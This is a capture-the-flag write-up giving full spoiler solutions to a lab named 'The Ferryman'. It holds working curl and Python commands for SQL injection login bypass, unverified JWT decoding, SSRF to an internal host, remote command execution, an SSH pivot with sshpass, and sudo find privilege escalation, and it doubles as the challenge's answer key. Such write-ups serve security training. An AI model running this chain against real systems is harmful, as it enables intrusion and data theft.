# Writeup — The Ferryman (SPOILERS)

Flag values below are placeholders since real values are per-deployment
secrets. Replace with what your own instance gives you.

1. View-source `/` → HTML comment.
2. `curl http://TARGET:8008/guest-token` → `{"token": "..."}`. Decode
   the payload: `python3 -c "import jwt; print(jwt.decode('<token>',
   options={'verify_signature': False}))"` → flag 2.
3. `curl -c jar.txt -d "username=' OR '1'='1' -- &password=x"
   http://TARGET:8008/login`, then `curl -b jar.txt
   http://TARGET:8008/admin` → flag 3.
4. `curl -b jar.txt --get --data-urlencode "url=http://waystation:7000/"
   http://TARGET:8008/admin/preview` → flag 4.
5. `curl -b jar.txt --get --data-urlencode
   "url=http://waystation:7000/config" http://TARGET:8008/admin/preview`
   → a base64 blob. Decode and XOR with `0x3C` (the key waystation's own
   homepage tells you): `python3 -c "import base64; print(bytes(b ^
   0x3C for b in base64.b64decode('<blob>')).decode())"` → recovers the
   token `WAY-7a21-STATION` and flag 5.
6. `curl -b jar.txt --get --data-urlencode
   "url=http://waystation:7000/run?token=WAY-7a21-STATION&cmd=cat+/opt/waystation/secret/flag6.txt"
   http://TARGET:8008/admin/preview` → flag 6, `traveler`'s vault
   password, and fragment A.
7. Pivot through the same RCE:
   ```
   curl -b jar.txt --get --data-urlencode \
     "url=http://waystation:7000/run?token=WAY-7a21-STATION&cmd=sshpass -p <password> ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null traveler@vault cat flag7.txt" \
     http://TARGET:8008/admin/preview
   ```
   → flag 7.
8. Same pattern, run `sudo find /root/flag8.txt -exec cat {} \;`
   instead → flag 8 and fragment B (GTFOBins' `find` entry, enabled via
   a sudoers NOPASSWD misconfiguration).
9. Same pattern again, `sudo find /root/ferryman_notes.log -exec cat {}
   \;` → flag 9 and fragment C.
10. `sudo find /root/dossier.enc -exec base64 -w0 {} \;` to get the
    encrypted file out as base64 (through the same chain), decode it
    locally, then:
    ```
    python3 docker/flagcrypto.py decrypt "<fragmentA><fragmentB><fragmentC>" dossier.enc -
    ```
    → flag 10.

**Gotcha worth knowing:** when you pull command output back through
this chain, SSH's own "Warning: Permanently added ... to the list of
known hosts" text lands concatenated directly onto the end of your
command's real output, with no newline in between. Strip everything
from the literal text `Warning: Permanently added` onward before you
try to base64-decode anything — trimming by line boundary won't catch it.

## Honeypots encountered (intentional, cost time only)
- Portal `/backup` — a plausible path, 501, nothing behind it.
- Waystation `/legacy` — a real, responding endpoint, nothing useful
  behind it.
